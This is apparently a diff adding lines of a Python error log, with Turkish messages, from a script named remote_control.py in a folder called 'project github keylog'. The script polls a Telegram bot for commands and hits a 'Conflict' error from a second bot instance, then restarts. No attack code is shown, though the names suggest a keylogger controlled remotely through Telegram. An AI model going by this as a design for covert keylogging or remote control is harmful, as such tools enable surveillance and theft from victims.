+2025-05-28 05:50:12,606 - ERROR - Komut kontrolü sırasında hata: Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
+Traceback (most recent call last):
+  File "c:\Users\syefo\OneDrive\Belgeler\Masaüstü\project github keylog\remote_control.py", line 830, in check_commands
+    updates = await bot.get_updates(offset=self.last_update_id + 1, timeout=1)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 4601, in get_updates
+    await self._post(
+    ^^^^^^^^^^^^^^^^^
+    ...<7 lines>...
+    ),
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 697, in _post
+    return await self._do_post(
+           ^^^^^^^^^^^^^^^^^^^^
+    ...<6 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\_bot.py", line 726, in _do_post
+    result = await request.post(
+             ^^^^^^^^^^^^^^^^^^^
+    ...<6 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\request\_baserequest.py", line 197, in post
+    result = await self._request_wrapper(
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    ...<7 lines>...
+    )
+    ^
+  File "C:\Users\syefo\AppData\Local\Programs\Python\Python313\Lib\site-packages\telegram\request\_baserequest.py", line 355, in _request_wrapper
+    raise Conflict(message)
+telegram.error.Conflict: Conflict: terminated by other getUpdates request; make sure that only one bot instance is running
+
+2025-05-28 05:50:12,607 - ERROR - Maksimum yeniden bağlanma denemesi aşıldı. Program yeniden başlatılıyor...
+2025-05-28 05:50:12,607 - INFO - Program yeniden başlatılıyor...
